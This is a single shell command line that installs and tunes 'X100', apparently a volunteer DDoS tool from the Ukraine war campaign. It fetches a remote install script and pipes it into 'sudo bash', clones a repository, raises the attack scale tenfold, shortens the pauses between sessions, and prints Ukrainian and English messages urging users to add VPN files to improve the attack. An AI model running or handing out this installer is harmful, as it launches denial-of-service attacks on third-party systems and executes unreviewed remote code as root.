cd ~ && sudo rm -rf pure-adss-x100 && sudo apt update -y && sudo apt install git wget screen mc vnstat sed unzip -y && sudo apt-get remove needrestart -y && sudo curl https://raw.githubusercontent.com/ihorlv/db1000nX100/main/source-code/scripts/install-x100slim-into-ubuntu.bash | sudo bash && cd ~ && git clone https://github.com/TatoEb/pure-adss-x100.git && cd pure-adss-x100 && sudo chmod +x *.sh && sudo cp ~/pure-adss-x100/*.* ~ && sudo rm -rf pure-adss-x100 && cd /media && sudo rm -rf put-your-ovpn-files-here && sudo mkdir put-your-ovpn-files-here && cd ~ && cd /root/x100/docker/x100-for-docker/put-your-ovpn-files-here && sudo cp x100-config.txt /media/put-your-ovpn-files-here && cd ~ && sudo cp ovpn.zip /media/put-your-ovpn-files-here && cd /media/put-your-ovpn-files-here && sudo sed -i 's/initialDistressScale=50/initialDistressScale=500/g' x100-config.txt && sudo sed -i 's/delayAfterSessionMinDuration=15/delayAfterSessionMinDuration=1/g' x100-config.txt && sudo sed -i 's/delayAfterSessionMaxDuration=45/delayAfterSessionMaxDuration=5/g' x100-config.txt && cd ~ && sudo chmod 777 -R /media/put-your-ovpn-files-here && sudo rm -rf ovpn.zip run_pure.sh InstallPureX100.sh README.md pure-adss-x100 && cd /media/put-your-ovpn-files-here && unzip ovpn.zip && sudo rm -rf ovpn.zip && sudo mcedit x100-config.txt && cd ~ && ./updX100p.sh && clear && printf '\e[3J' && echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ && echo + Congratulations! X100 has been successfully installed! + && echo + You can add your *.ovpn files for improving the attack + && echo + For starting X100 just type ./X100p.sh and press Enter + && echo + X100 will accelerate strongly during the next sessions + && echo + Many thanks to You for Your support! Glory to Ukraine! + && echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ && echo + Мої вітання! Х100 було успішно встановлено в цій с-мі! + && echo + Можете також додати свої *.ovpn файли для кращої атаки + && echo + Для запуску Х100 введіть ./X100p.sh та натисніть Enter + && echo + X100 буде потужно розганятись впродовж наступних сесій + && echo + Дякую Вам за Ваші зусилля та підтримку! Слава Україні! + && echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
